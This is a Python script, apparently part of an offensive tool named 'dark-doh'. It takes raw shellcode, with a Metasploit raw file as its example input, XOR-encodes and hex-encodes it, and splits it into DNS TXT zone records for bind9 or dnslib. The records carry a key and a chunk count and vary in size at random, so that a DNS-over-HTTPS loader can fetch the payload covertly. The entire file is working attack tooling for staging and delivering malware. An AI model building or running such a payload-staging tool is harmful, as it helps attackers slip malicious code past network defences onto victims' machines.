#!/usr/bin/env python3

# - The script that prepares DNS zones to be used with dark-doh
# - bind and dnslib are supported

# darksh3llRU v1.4
# 11 August 2022: release without script's input checks
# 28 February 2023: update for bigger TXT size
# 26 June 2023: added random TXT record size (sc_split, n variable)
# 20 July 2023: change DNSLIB zone generation to "bind"-like without each record TTL

import argparse, sys, struct, os, subprocess, pefile, time, random
from os import path
from termcolor import colored

def sc_encode(sc_file, xorkey):
	x = 0; output = b""; 
	key = int.from_bytes(xorkey.encode(),byteorder='little')

	try:
		with open(sc_file, "br") as f:
			payload = f.read()
	except Exception as e:
		print("Can't open {0}".format(sc_file))
		print("Exception: {0}".format(e))
		quit()

	if len(payload) % 4:
		payload += b"\x90" * (4 - (len(payload) % 4))

	while x < len(payload):
		d = struct.unpack("<L", payload[x:x+4])
		output += struct.pack("<L", d[0] ^ key)
		x += 4
	
	alphanum = "".join("{:02X}".format(c) for c in output)

	return alphanum

def txt_split(data, length):
	#print(data)
	dChunks = [""]; output = ''
	l = int(length); i = 0; j = 1
	while i < len(data):
		if i+l < len(data):
			dChunks.append(data[i:i+l])
			output += '"' + dChunks[j] + '"\n'
		else:
			dChunks.append(data[i:len(data)])
			output += '"' + dChunks[j] + '"'
		i += l; j += 1
	output = '(' + output + ')'

	return output


def sc_split(string, txtsize, path, xorkey, fname):
	outputFolder = os.path.splitext(path)[0] + "-output/"
	try: 
		os.mkdir(outputFolder) 
	except OSError as error: 
		print(error)

	ns_file = open(outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".dnslib-records", "w")
	bind_file = open(outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".bind9-records", "w")

	chunks = [""]
	temp_n = int(txtsize); i = 0; j = 1

	while i < len(string):
		n = temp_n - random.randint(100,200)
		if i+n < len(string):
			chunks.append(string[i:i+n])
		else:
			chunks.append(string[i:len(string)])
		fRecord = txt_split(chunks[j], 255)
		ns_file.write(fname + str(j) + '\tIN\tTXT\t' + fRecord + '\n')
		bind_file.write(fname + str(j) + '\t1m\tIN\tTXT\t' + fRecord + '\n')
		i += n; j += 1

	ns_file.write(fname + str(0) + '\tIN\tTXT\t' + '"' + xorkey + '"' + '\n')
	ns_file.write(fname + '\tIN\tTXT\t' + '"' + str(j-1) + '"' + '\n')
	bind_file.write(fname + str(0) + '\t1m\tIN\tTXT\t' + '"' + xorkey + '"' + '\n')
	bind_file.write(fname + '\t1m\tIN\tTXT\t' + '"' + str(j-1) + '"' + '\n')

	print("dnslib compatible zone records are written to the file: " + outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".dnslib-records")
	print("bind9 compatible zone records are written to the file: " + outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".bind9-records\n")
	ns_file.close(); bind_file.close();

	dnslib_zone_template = ("""
$TTL 300
$ORIGIN yourdomain.com.

@	IN	NS	ns1.yourdomain.com.
@	IN	NS	ns2.dyourdomain.com.
ns1     IN      A       127.0.0.1
ns2     IN      A       127.0.0.1
	""")
	print("\nAdd dnslib records to a simple zone template\n" + dnslib_zone_template + "\nrun dnslib zoneresolver.py, ex:\npython zoneresolver.py --zone yourzone.txt --port 53 --adddress YOUR_IP")	

	return (j-1);


def start_menu():
	parser = argparse.ArgumentParser(
		description = 
'''
~~~~~ py script that generates dns zone files to be used with dark-doh ~~~~~
''',
		epilog =
'''

''', formatter_class = argparse.RawTextHelpFormatter)
	parser.add_argument('-sc_file', help =
'''
The file to be prepared or a raw shellcode, ex: msf.raw
''')
	parser.add_argument('-xkey', help =
'''
4-bytes XOR key value (no input checks), ex: test
''')
	parser.add_argument('-size', help =
'''
dns TXT record size up to 2048, ex: 100
''')
	parser.add_argument('-dnsfile', help =
'''
The subdomain name used for file serving, ex: filename
''')

	args=parser.parse_args()
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()
	else:
		return args.sc_file, args.xkey, args.size, args.dnsfile

if __name__=='__main__':

	sc_file, xkey, size, dnsfile = start_menu()

	sc_alpha_string = sc_encode(sc_file, xkey)

	sc_split(sc_alpha_string, size, sc_file, xkey, dnsfile)

	exit(0);
